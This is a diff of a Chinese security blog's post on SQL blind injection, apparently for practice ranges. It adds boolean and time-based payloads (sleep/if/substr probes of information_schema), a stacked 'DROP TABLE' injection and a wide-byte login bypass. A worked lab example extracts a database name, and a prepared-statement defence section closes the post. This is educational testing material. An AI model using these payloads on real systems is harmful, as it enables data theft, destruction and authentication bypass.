+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">判断过程</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;  #无回显</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;&#x27;  #无回显</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;&#x27;&#x27;  #无回显</span><br><span class="line">?<span class="attribute">id</span>=1 <span class="keyword">and</span> <span class="attribute">1</span>=2  #无回显</span><br><span class="line">?<span class="attribute">id</span>=1 amd <span class="attribute">1</span>=1  #正常回显</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/19/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230708212204276.png" alt="image-20230708212204276" style="zoom: 50%;"><img src="/2022/08/19/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230708212237680.png" alt="image-20230708212237680" style="zoom: 50%;"></p>
+<p>测试字段数为2</p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>%20order%20by%202 <span class="comment">#正常回显</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/19/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230708212655168.png" alt="image-20230708212655168" style="zoom:50%;"></p>
+<p>破解数据库名长度为5</p>
+<p><img src="/2022/08/19/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230708212140770.png" alt="image-20230708212140770" style="zoom:50%;"></p>
 ]]></content>
       <categories>
         <category>web攻防</category>
@@ -5535,9 +5913,9 @@ n-1轮处理：循环遍历所有顶点，找到还没确定最短路径，且di
   <entry>
     <title>SQL盲注</title>
     <url>/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>对sql注入类型的判断以及对于盲注的两种方法二分法和爆破法的实现</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>对sql注入类型的判断以及对于盲注的两种类型：布尔盲注和时间盲注</p>
 <span id="more"></span>
-<h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>(1)首先判断时字符型还是数字型注入<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151435068.png" alt><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151552860.png" alt></p>
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>(1)首先判断时字符型还是数字型注入<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151435068.png" alt><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151552860.png" alt></p>
 <figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">分析：</span><br><span class="line">依次输入</span><br><span class="line"><span class="number">1</span>                    回显：exists</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>            回显：exists</span><br><span class="line"><span class="keyword">and</span>逻辑语句的会先结果都是存在的，没有起到应有的效果，说明不是整型注入，猜测是字符型注入</span><br></pre></td></tr></table></figure>
 <p>(2)猜解字符型<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151701973.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151816959.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151840594.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151903942.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151924099.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818160837212.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818160855152.png" alt></p>
 <figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">分析：</span><br><span class="line">通过上面<span class="number">5</span>个图找到了引号插入点后，依次输入</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span>                 回显：missing</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span>                  回显：<span class="keyword">exists</span></span><br><span class="line">and和or语句起到了效果，说明是字符型注入</span><br><span class="line">并且经过<span class="meta">#和--的测试，注释符也没有被过滤</span></span><br></pre></td></tr></table></figure>
@@ -5557,7 +5935,21 @@ n-1轮处理：循环遍历所有顶点，找到还没确定最短路径，且di
 <p>语法：1’and length(substr((select user from users limit 0,1),1))=’X        X为第一个字段值长度，第二、三个字段值更换limit函数参数<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818171129966.png" alt><br>如图所示，users字段值中第一个字段值长度为5</p>
 <p>语法：1’and ascii(substr((select user from users limit 0,1),1,1))=’X             X为第一个字段值第一个字符的ascll码<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818171222053.png" alt></p>
 <p>注：password表中得到的是md5加密后的结果需要自行解密</p>
-<h2 id="堆叠"><a href="#堆叠" class="headerlink" title="堆叠"></a>堆叠</h2><p>假设应用程序在执行SQL查询时使用了以下代码：</p>
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>首先要知道的函数</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sleep()<span class="operator">/</span>延迟函数</span><br><span class="line">if(<span class="keyword">condition</span>,<span class="literal">true</span>,<span class="literal">false</span>)<span class="operator">/</span>若条件为真 返回<span class="literal">true</span>，若条件为假 返回<span class="literal">false</span></span><br><span class="line"><span class="built_in">substring</span>(&quot;string&quot;,strart,length)</span><br></pre></td></tr></table></figure>
+<h3 id="数据库名长"><a href="#数据库名长" class="headerlink" title="数据库名长"></a>数据库名长</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())&gt;X,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
+<p>如果数据库名长大于X返回1否则睡十秒</p>
+<h3 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h3><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; <span class="keyword">and</span> <span class="keyword">if</span>((ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)))&gt;X,<span class="number">1</span>,sleep(<span class="number">10</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>二分法或者爆破法，请参考<a href="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/" title="SQL盲注">SQL布尔盲注</a></p>
+<h3 id="表的个数"><a href="#表的个数" class="headerlink" title="表的个数"></a>表的个数</h3><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">？id=<span class="number">1&#x27;</span> <span class="function"><span class="keyword">and</span> <span class="title">if</span>(<span class="params">(<span class="keyword">select</span> count(*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=’dvwa’ limit <span class="number">0</span>,<span class="number">1</span>)=X,<span class="number">1</span>,sleep(<span class="number">10</span>))<span class="meta">#</span></span><br></pre></td></tr></table></figure>
+<h3 id="表名长度"><a href="#表名长度" class="headerlink" title="表名长度"></a>表名长度</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">？<span class="attribute">id</span>=1&#x27; <span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((select table_name <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=’dvwa’ limit 0,1),A,1))&gt;X，1，sleep(10))#</span><br></pre></td></tr></table></figure>
+<h3 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h3><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if((ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))&gt;X,<span class="number">1</span>,sleep(<span class="number">10</span>))--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="字段的数量"><a href="#字段的数量" class="headerlink" title="字段的数量"></a>字段的数量</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> count(*) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=’users’)=X,<span class="number">1</span>,sleep(<span class="number">10</span>)#</span><br></pre></td></tr></table></figure>
+<h3 id="字段长"><a href="#字段长" class="headerlink" title="字段长"></a>字段长</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>(length(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=’users’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br></pre></td></tr></table></figure>
+<h3 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=’users’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br></pre></td></tr></table></figure>
+<h3 id="字段值"><a href="#字段值" class="headerlink" title="字段值"></a>字段值</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">查询<span class="keyword">user</span>字段的数据</span><br><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> count(*) <span class="keyword">from</span> users)=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br><span class="line">查询第一个数据的长度</span><br><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>(length(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br><span class="line">爆出第一个数据值</span><br><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br></pre></td></tr></table></figure>
+<p>可以看到时间盲注相比于布尔盲注只是多了一个if函数来执行sleep函数代替回显。</p>
+<h1 id="其他类型"><a href="#其他类型" class="headerlink" title="其他类型"></a>其他类型</h1><h2 id="堆叠"><a href="#堆叠" class="headerlink" title="堆叠"></a>堆叠</h2><p>假设应用程序在执行SQL查询时使用了以下代码：</p>
 <figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">sqlCopy code</span><br><span class="line"><span class="keyword">SELECT</span> column1 <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> column2 = <span class="string">&#x27;input&#x27;</span></span><br></pre></td></tr></table></figure>
 <p>攻击者可以通过注入恶意的输入来构造一个堆叠攻击，例如：</p>
 <figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">cssCopy code</span><br><span class="line"><span class="keyword">input</span>&#x27; ; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">table</span> ; --</span><br></pre></td></tr></table></figure>
@@ -5569,6 +5961,21 @@ n-1轮处理：循环遍历所有顶点，找到还没确定最短路径，且di
 <p>攻击者可以在用户名和密码字段中注入宽字节编码的恶意输入，如下所示：</p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">makefileCopy</span> codeUsername: admin%bf%<span class="number">27</span> OR <span class="number">1</span>=<span class="number">1</span> --</span><br><span class="line"><span class="attribute">Password</span>: anything</span><br></pre></td></tr></table></figure>
 <p>在这个示例中，攻击者在用户名字段中注入了宽字节编码的<code>%bf%27</code>，它被解析为单引号（’）字符。这样，SQL查询的条件变为<code>username = &#39;admin&#39; OR 1=1 --&#39;</code>，使得条件始终为真，绕过了用户名和密码的验证。</p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>靶场：<a href="https://hack.zkaq.cn/battle/target?id=485e58d0afa7e4f7">https://hack.zkaq.cn/battle/target?id=485e58d0afa7e4f7</a></p>
+<p>判断注入类型为数字型盲注无报错信息考虑使用时间盲注</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">判断过程</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;  #无回显</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;&#x27;  #无回显</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;&#x27;&#x27;  #无回显</span><br><span class="line">?<span class="attribute">id</span>=1 <span class="keyword">and</span> <span class="attribute">1</span>=2  #无回显</span><br><span class="line">?<span class="attribute">id</span>=1 amd <span class="attribute">1</span>=1  #正常回显</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20230708212204276.png" alt="image-20230708212204276" style="zoom: 50%;"><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20230708212237680.png" alt="image-20230708212237680" style="zoom: 50%;"></p>
+<p>测试字段数为2</p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>%20order%20by%202 <span class="comment">#正常回显</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20230708212655168.png" alt="image-20230708212655168" style="zoom:50%;"></p>
+<p>破解数据库名长度为6</p>
+<p><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20230708212140770.png" alt="image-20230708212140770" style="zoom:50%;"></p>
+<p>破解数据库名，得到数据库为maoshe</p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>%20and%20ascii(<span class="keyword">substr</span>(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">109</span>--+		得到第一位m</span><br><span class="line">?id=<span class="number">1</span>%20and%20ascii(<span class="keyword">substr</span>(database(),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">97</span>--+	  	得到第二位a</span><br><span class="line">?id=<span class="number">1</span>%20and%20ascii(<span class="keyword">substr</span>(database(),<span class="number">3</span>,<span class="number">1</span>))=<span class="number">111</span>--+		得到第三位o</span><br><span class="line">?id=<span class="number">1</span>%20and%20ascii(<span class="keyword">substr</span>(database(),<span class="number">4</span>,<span class="number">1</span>))=<span class="number">115</span>--+		得到第四位s</span><br><span class="line">?id=<span class="number">1</span>%20and%20ascii(<span class="keyword">substr</span>(database(),<span class="number">5</span>,<span class="number">1</span>))=<span class="number">104</span>--+		得到第五位h</span><br><span class="line">?id=<span class="number">1</span>%20and%20ascii(<span class="keyword">substr</span>(database(),<span class="number">6</span>,<span class="number">1</span>))=<span class="number">101</span>--+		得到第六位e</span><br></pre></td></tr></table></figure>
+<p>破解maoshe数据库中的表数量为4</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> count(*) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;maoshe&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">4</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20230708224314618.png" alt="image-20230708224314618"></p>
+<p>获取表长</p>
 <h1 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h1><h2 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h2><ol>
 <li>准备预编译语句：在编写SQL查询时，使用占位符（如<code>?</code>或命名参数）代替动态的查询值。这样，SQL查询成为一个模板，其中包含了占位符而不是实际的用户输入。</li>
 <li>准备并绑定参数：在执行SQL查询之前，使用数据库的预编译功能准备预编译语句。然后，将实际的用户输入值绑定到预编译语句的占位符上。绑定参数会自动进行适当的转义和处理，确保用户输入被视为数据而不是SQL代码。</li>
